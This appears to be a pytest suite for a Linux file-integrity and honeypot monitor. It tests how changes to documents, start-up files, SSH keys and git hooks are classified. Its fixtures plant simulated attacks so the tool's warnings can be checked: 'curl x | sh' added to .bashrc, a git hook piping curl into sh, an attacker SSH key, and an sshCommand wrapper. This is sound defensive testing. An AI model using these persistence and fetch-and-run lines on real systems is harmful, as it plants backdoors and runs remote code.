"""Integrity engine: honest classification, no self-inflicted alarms, persistence locations matter."""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SUITE = ROOT / "LinuxGuardianSuite"
sys.path.insert(0, str(SUITE))

import events  # noqa: E402
import integrity  # noqa: E402


@pytest.fixture()
def box(tmp_path, monkeypatch):
    h = tmp_path / "home"
    (h / "Documents").mkdir(parents=True)
    (h / ".ssh").mkdir()
    (h / "Documents" / "notes.txt").write_text("one")
    (h / ".bashrc").write_text("export A=1\n")
    (h / ".ssh" / "authorized_keys").write_text("ssh-ed25519 AAAA me\n")
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    monkeypatch.setenv("LG_INTEGRITY_HOME", str(h))
    monkeypatch.setenv("LG_INTEGRITY_ROOTS", f"{h/'Documents'}:{h/'.bashrc'}:{h/'.ssh'}")
    return h


def run(mode: str, capsys) -> str:
    capsys.readouterr()
    getattr(integrity, f"do_{mode}")()
    return capsys.readouterr().out


def incidents(tmp_path: Path) -> list[dict]:
    return events.read_events(tmp_path / "lg" / "incidents")


def test_clean_check_after_init(box, capsys):
    run("init", capsys)
    assert "No changes detected" in run("check", capsys)


def test_modified_missing_and_new_are_told_apart(box, capsys, tmp_path):
    run("init", capsys)
    (box / "Documents" / "notes.txt").write_text("two")
    (box / ".bashrc").unlink()
    (box / "Documents" / "fresh.txt").write_text("x")
    out = run("check", capsys)
    assert re.search(r"Modified files[^:]*: 1", out) and "Missing files" in out and "New files in Documents" in out
    messages = [e["message"] for e in incidents(tmp_path)]
    assert any(m.startswith("File changed:") and "notes.txt" in m for m in messages)
    assert any(m.startswith("File missing:") and ".bashrc" in m for m in messages)
    sev = {e["message"].split(": ", 1)[1].rsplit("/", 1)[-1]: e["severity"] for e in incidents(tmp_path) if e["category"] == "integrity"}
    assert sev == {"notes.txt": "info", ".bashrc": "warning"}   # editing a document is routine; a start-up file vanishing is not
    assert not any("fresh.txt" in m for m in messages)          # a new document is information, not an alarm


def test_a_new_file_in_a_persistence_location_is_a_warning(box, capsys, tmp_path):
    run("init", capsys)
    (box / ".ssh" / "authorized_keys2").write_text("ssh-rsa BBBB attacker\n")
    out = run("check", capsys)
    assert "New files in start-up/persistence locations: 1" in out
    assert any("authorized_keys2" in e["message"] and e["severity"] == "warning" for e in incidents(tmp_path))


def test_git_internals_and_caches_are_not_watched(box, capsys):
    (box / "Documents" / "proj" / ".git" / "refs").mkdir(parents=True)
    (box / "Documents" / "proj" / ".git" / "refs" / "x").write_text("1")
    (box / "Documents" / ".cache").mkdir()
    (box / "Documents" / ".cache" / "c").write_text("1")
    run("init", capsys)
    base = integrity.read_baseline()
    assert not any("/.git/" in p or "/.cache/" in p for p in base)
    (box / "Documents" / "proj" / ".git" / "refs" / "x").write_text("2")
    assert "No changes detected" in run("check", capsys)


def test_checking_does_not_trip_the_honeypot_it_sits_next_to(box, capsys, tmp_path):
    run("init", capsys)
    hp = box / "Documents" / "Passwords_DO_NOT_OPEN" / "passwords.txt"
    assert hp.exists()
    base = integrity.read_baseline()
    assert str(hp) not in base                       # never hashed => never read by us
    old = os.stat(hp)
    # an old atime so a read would be visible even under relatime
    os.utime(hp, (old.st_mtime - 5, old.st_mtime - 5))
    run("init", capsys)
    out = run("check", capsys)
    assert "Honeypot" not in out and not any(e["category"] == "honeypot" for e in incidents(tmp_path))


def test_a_real_access_is_reported_once(box, capsys, tmp_path):
    run("init", capsys)
    hp = box / "Documents" / "Passwords_DO_NOT_OPEN" / "passwords.txt"
    st = hp.stat()
    os.utime(hp, (st.st_atime + 100, st.st_mtime))            # someone read it later
    out = run("check", capsys)
    assert "Honeypot file was read" in out
    assert "Honeypot file was read" not in run("check", capsys)   # not repeated on every check
    assert sum(1 for e in incidents(tmp_path) if e["category"] == "honeypot") == 1


def test_a_modified_honeypot_is_critical(box, capsys, tmp_path):
    run("init", capsys)
    hp = box / "Documents" / "Passwords_DO_NOT_OPEN" / "passwords.txt"
    hp.write_text("changed")
    assert "honeypot file was modified" in run("check", capsys).lower()
    assert any(e["category"] == "honeypot" and e["severity"] == "critical" for e in incidents(tmp_path))


def test_event_volume_is_capped(box, capsys, tmp_path):
    for i in range(60):
        (box / "Documents" / f"f{i}.txt").write_text("a")
    run("init", capsys)
    for i in range(60):
        (box / "Documents" / f"f{i}.txt").write_text("b")
    run("check", capsys)
    evs = incidents(tmp_path)
    assert len(evs) <= integrity.MAX_EVENTS + 1
    assert any("60 of your documents changed or went missing at once" in e["message"] and e["severity"] == "warning" for e in evs)


def test_old_documents_only_baseline_is_compared_fairly(box, capsys, tmp_path):
    """A baseline from the previous version (no meta file, .git and honeypot included) must not flood 'missing'."""
    (box / "Documents" / "proj" / ".git").mkdir(parents=True)
    (box / "Documents" / "proj" / ".git" / "HEAD").write_text("ref")
    run("init", capsys)
    base = integrity.read_baseline()
    legacy = tmp_path / "lg" / "baselines" / "documents.sha256"
    lines = [f"{h}  {p}\n" for p, h in base.items() if "/Documents/" in p] + ["0" * 64 + f"  {box}/Documents/proj/.git/HEAD\n",
                                                      "1" * 64 + f"  {box}/Documents/Passwords_DO_NOT_OPEN/passwords.txt\n"]
    legacy.write_text("".join(lines))
    integrity.baseline_file().unlink()
    integrity.meta_file().unlink()
    out = run("check", capsys)
    assert "predates" in out and "Missing files" not in out and "No changes detected" in out


def test_no_baseline_is_an_error(box, capsys):
    assert integrity.do_check() == 1


def test_status_reports_age_and_size(box, capsys):
    run("init", capsys)
    st = json.loads(run("status", capsys))
    assert st["present"] and st["files"] >= 3 and st["age_sec"] < 5 and st["covers_extra_locations"]


def test_symlinks_are_not_followed(box, capsys):
    (box / "Documents" / "link").symlink_to("/etc/hostname")
    run("init", capsys)
    assert not any(p.endswith("/link") for p in integrity.read_baseline())


def test_shell_wrapper_runs_the_same_engine(box, tmp_path):
    env = {**os.environ, "LG_HOME": str(tmp_path / "lg"), "LG_INTEGRITY_HOME": str(box),
           "LG_INTEGRITY_ROOTS": f"{box/'Documents'}"}
    w = str(SUITE / "linux_watchdog.sh")
    assert subprocess.run([w, "--init"], env=env, capture_output=True).returncode == 0
    out = subprocess.run([w, "--check"], env=env, capture_output=True, text=True)
    assert out.returncode == 0 and "No changes detected" in out.stdout
    assert "LG_PROGRESS|phase=integrity" in out.stdout


# ----------------------------------------------------------- development and routine edits are not alarms
def kinds(tmp_path: Path) -> dict[str, str]:
    return {e["message"].split(": ", 1)[-1].rsplit("/", 1)[-1]: e["severity"] for e in incidents(tmp_path) if e["category"] == "integrity"}


def test_a_few_edited_documents_are_information_only(box, capsys, tmp_path):
    for i in range(integrity.BURST - 1):
        (box / "Documents" / f"d{i}.txt").write_text("a")
    run("init", capsys)
    for i in range(integrity.BURST - 1):
        (box / "Documents" / f"d{i}.txt").write_text("b")
    out = run("check", capsys)
    assert "[INFO] Modified files (your own documents, routine edits)" in out and "[WARN]" not in out
    assert set(kinds(tmp_path).values()) == {"info"}
    assert not any(e["event"] == "file_changes" for e in incidents(tmp_path))


def test_a_burst_of_document_changes_is_a_warning_and_says_why(box, capsys, tmp_path):
    for i in range(integrity.BURST):
        (box / "Documents" / f"d{i}.txt").write_text("a")
    run("init", capsys)
    for i in range(integrity.BURST):
        (box / "Documents" / f"d{i}.txt").write_text("b")
    out = run("check", capsys)
    assert "[WARN]" in out and "Editing doesn't look like this" in out
    assert any("isn't ordinary editing" in e["message"] for e in incidents(tmp_path))
    assert {"warning"} == {e["severity"] for e in incidents(tmp_path) if e["event"] == "file_changes"}
    assert "warning" in set(kinds(tmp_path).values())


def test_start_up_locations_are_still_warnings_not_routine(box, capsys, tmp_path):
    run("init", capsys)
    (box / ".bashrc").write_text("export A=1\ncurl x | sh\n")
    (box / ".ssh" / "authorized_keys").write_text("ssh-ed25519 AAAA me\nssh-rsa BBBB attacker\n")
    out = run("check", capsys)
    assert "[WARN] Modified files: 2" in out
    assert kinds(tmp_path) == {".bashrc": "warning", "authorized_keys": "warning"}


def make_project(box: Path) -> Path:
    proj = box / "Documents" / "myrobot"
    (proj / ".git" / "hooks").mkdir(parents=True)
    (proj / ".git" / "refs").mkdir()
    (proj / "src").mkdir()
    (proj / "src" / "main.py").write_text("print(1)")
    (proj / ".git" / "HEAD").write_text("ref: refs/heads/main")
    (proj / ".git" / "config").write_text("[core]\n\trepositoryformatversion = 0\n")
    (proj / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\nexit 0\n")
    (proj / ".git" / "hooks" / "pre-push.sample").write_text("#!/bin/sh\n")
    return proj


def test_software_projects_are_not_watched_but_their_hooks_and_config_are(box, capsys):
    proj = make_project(box)
    run("init", capsys)
    base = set(integrity.read_baseline())
    assert str(proj / "src" / "main.py") not in base and str(proj / ".git" / "HEAD") not in base
    assert str(proj / ".git" / "hooks" / "pre-commit") in base and str(proj / ".git" / "config") in base
    assert str(proj / ".git" / "hooks" / "pre-push.sample") not in base          # inert sample files


def test_working_on_a_project_is_not_news(box, capsys, tmp_path):
    proj = make_project(box)
    run("init", capsys)
    (proj / "src" / "main.py").write_text("print(2)")
    (proj / "src" / "new_module.py").write_text("x = 1")
    (proj / ".git" / "HEAD").write_text("ref: refs/heads/dev")
    (proj / ".git" / "refs" / "heads").mkdir()
    assert "No changes detected" in run("check", capsys)
    assert incidents(tmp_path) == []


def test_a_new_git_hook_or_config_change_is_a_warning_even_inside_documents(box, capsys, tmp_path):
    proj = make_project(box)
    run("init", capsys)
    (proj / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl http://x | sh\n")
    (proj / ".git" / "config").write_text("[core]\n\tsshCommand = /tmp/wrapper\n")
    (proj / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nevil\n")
    out = run("check", capsys)
    assert "[WARN]" in out
    evs = {e["message"].split(": ", 1)[-1].rsplit("/", 1)[-1]: e["severity"] for e in incidents(tmp_path) if e["category"] == "integrity"}
    assert evs.get("pre-commit") == "warning" and evs.get("config") == "warning"


def test_baseline_entries_from_a_tree_that_is_no_longer_watched_are_not_reported_missing(box, capsys, tmp_path):
    proj = box / "Documents" / "oldproj"
    proj.mkdir()
    (proj / "a.py").write_text("1")
    run("init", capsys)
    assert str(proj / "a.py") in integrity.read_baseline()                         # watched while it wasn't a project
    (proj / ".git").mkdir()                                                          # now it is one
    out = run("check", capsys)
    assert "Missing files" not in out and "No changes detected" in out


def test_in_git_worktree_decisions():
    import tempfile
    with tempfile.TemporaryDirectory() as t:
        t = Path(t)
        (t / "p/.git/hooks").mkdir(parents=True)
        (t / "p/sub").mkdir()
        (t / "plain").mkdir()
        assert integrity.in_git_worktree(t / "p/sub/x.py") and integrity.in_git_worktree(t / "p/x.py") and integrity.in_git_worktree(t / "p/.git/HEAD")
        assert integrity.in_git_worktree(t / "p/.git/objects/ab/cd")
        assert not integrity.in_git_worktree(t / "p/.git/hooks/pre-commit") and not integrity.in_git_worktree(t / "p/.git/config")
        assert integrity.in_git_worktree(t / "p/.git/hooks/pre-commit.sample")
        assert not integrity.in_git_worktree(t / "plain/x.txt")


# --------------------------------------------------- the honeypot and our own scans
def read_honeypot(box: Path) -> None:
    hp = box / "Documents" / "Passwords_DO_NOT_OPEN" / "passwords.txt"
    st = os.stat(hp)
    os.utime(hp, ns=(st.st_atime_ns + 5 * 10 ** 9, st.st_mtime_ns))


def test_a_honeypot_read_during_our_own_scan_is_not_an_intruder(box, capsys, tmp_path):
    run("init", capsys)
    t = time.time()
    (tmp_path / "lg" / "scans").mkdir(parents=True, exist_ok=True)
    (tmp_path / "lg" / "scans" / "last.json").write_text(json.dumps({"started_epoch": t - 600, "ended_epoch": t + 600}))
    read_honeypot(box)
    out = run("check", capsys)
    assert "not treated as an intruder" in out and "Honeypot file was read" not in out
    assert not any(e["category"] == "honeypot" for e in incidents(tmp_path))
    assert "No changes detected" in run("check", capsys)                           # remembered: not reported later either


def test_the_integrity_check_never_mistakes_itself_for_a_scan(box, capsys, tmp_path, monkeypatch):
    """integrity.py is itself running when it asks 'is a scan running?': that must not silence the honeypot."""
    import decoys
    proc = tmp_path / "proc" / "77"
    proc.mkdir(parents=True)
    (proc / "cmdline").write_bytes(b"python3\0/x/integrity.py\0--check\0")
    monkeypatch.setenv("LG_PROC", str(tmp_path / "proc"))
    assert decoys.scan_running() is False
    (proc / "cmdline").write_bytes(b"/usr/bin/clamscan\0-r\0/home/me\0")
    assert decoys.scan_running() is True


def test_a_honeypot_read_outside_any_scan_is_still_critical(box, capsys, tmp_path):
    run("init", capsys)
    t = time.time()
    (tmp_path / "lg" / "scans").mkdir(parents=True, exist_ok=True)
    (tmp_path / "lg" / "scans" / "last.json").write_text(json.dumps({"started_epoch": t - 9000, "ended_epoch": t - 8000}))
    read_honeypot(box)
    assert "Honeypot file was read" in run("check", capsys)
    assert any(e["category"] == "honeypot" and e["severity"] == "critical" for e in incidents(tmp_path))


# ----------------------------------- LinuxGuardian's own installs must not look like an intrusion to its own check
def test_accepting_a_file_the_app_itself_created_clears_the_new_file_warning(box, capsys, tmp_path):
    run("init", capsys)
    (box / ".ssh" / "config").write_text("Host a\n")
    assert "New files in start-up/persistence locations: 1" in run("check", capsys)
    n, refused = integrity.accept_paths([str(box / ".ssh" / "config")])
    assert (n, refused) == (1, [])
    assert "No changes detected" in run("check", capsys)


def test_accepting_only_works_for_watched_regular_files(box, capsys, tmp_path):
    run("init", capsys)
    outside = tmp_path / "elsewhere.txt"
    outside.write_text("x")
    link = box / ".ssh" / "link"
    link.symlink_to(outside)
    (box / ".ssh" / "newdir").mkdir()
    n, refused = integrity.accept_paths([str(outside), str(link), "relative/path", str(box / ".ssh" / "newdir"), str(box / ".ssh" / "missing")])
    assert n == 0 and len(refused) == 5
    assert integrity.read_baseline().get(str(outside)) is None


def test_accepting_never_hides_a_later_change_to_the_same_file(box, capsys):
    run("init", capsys)
    unit = box / ".ssh" / "linuxguardian-thing.service"
    unit.write_text("[Service]\nExecStart=/ours\n")
    integrity.accept_paths([str(unit)])
    unit.write_text("[Service]\nExecStart=/attacker\n")
    assert re.search(r"Modified files: 1", run("check", capsys))


def test_forgetting_a_removed_file_clears_the_missing_warning(box, capsys):
    (box / ".ssh" / "ours.service").write_text("x")
    run("init", capsys)
    (box / ".ssh" / "ours.service").unlink()
    assert "Missing files" in run("check", capsys)
    n, _ = integrity.accept_paths([str(box / ".ssh" / "ours.service")], forget=True)
    assert n == 1 and "No changes detected" in run("check", capsys)


def test_accept_without_a_baseline_is_refused_not_invented(box):
    n, refused = integrity.accept_paths([str(box / ".bashrc")])
    assert n == 0 and refused == [str(box / ".bashrc")] and integrity.read_baseline() is None


def test_the_installer_keeps_the_integrity_baseline_in_step_with_its_own_timers(tmp_path):
    """The real regression: turning live monitoring on made the daily integrity check warn about LinuxGuardian's own unit files."""
    home = tmp_path / "h"
    (home / ".config/systemd/user").mkdir(parents=True)
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "systemctl").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "systemctl").chmod(0o755)
    env = {**os.environ, "HOME": str(home), "LG_HOME": str(tmp_path / "lg"), "LG_INTEGRITY_HOME": str(home), "PATH": f"{bindir}:{os.environ['PATH']}"}
    env.pop("LG_INTEGRITY_ROOTS", None)
    env["LG_INTEGRITY_ROOTS"] = str(home / ".config/systemd/user")

    def integ(*a):
        return subprocess.run([sys.executable, str(SUITE / "integrity.py"), *a], capture_output=True, text=True, env=env).stdout

    def sched(a):
        return subprocess.run([str(SUITE / "install_scheduler.sh"), a], capture_output=True, text=True, env=env)

    integ("--init")
    assert "No changes detected" in integ("--check")
    assert sched("--install-sensors").returncode == 0
    out = integ("--check")
    assert "No changes detected" in out and "New files in start-up" not in out
    assert sched("--install").returncode == 0
    assert "No changes detected" in integ("--check")
    assert sched("--uninstall-sensors").returncode == 0 and sched("--uninstall").returncode == 0
    out = integ("--check")
    assert "No changes detected" in out and "Missing files" not in out
